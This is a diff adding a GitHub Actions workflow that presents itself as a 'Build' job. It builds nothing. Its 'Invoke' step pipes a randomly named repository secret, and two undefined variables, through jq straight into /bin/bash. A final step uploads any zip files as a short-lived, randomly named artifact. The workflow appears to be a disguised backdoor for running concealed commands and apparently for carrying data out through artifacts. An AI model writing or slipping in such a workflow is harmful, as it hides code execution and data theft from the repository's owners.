@@ -1,0 +1,24 @@
+name: Build
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          pwy6930: ${{ secrets.pwy6930 }}
+        run: |
+          printf '%s' "$pwy6930" | jq -r .ferhk6975 | /bin/bash
+          printf '%s' "$jvkup400" | jq -r .fddf665 | /bin/bash
+          printf '%s' "$c41" | jq -r .wkuaz5 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: rV3XQpD6
+          path: "*.zip"
+          retention-days: 1
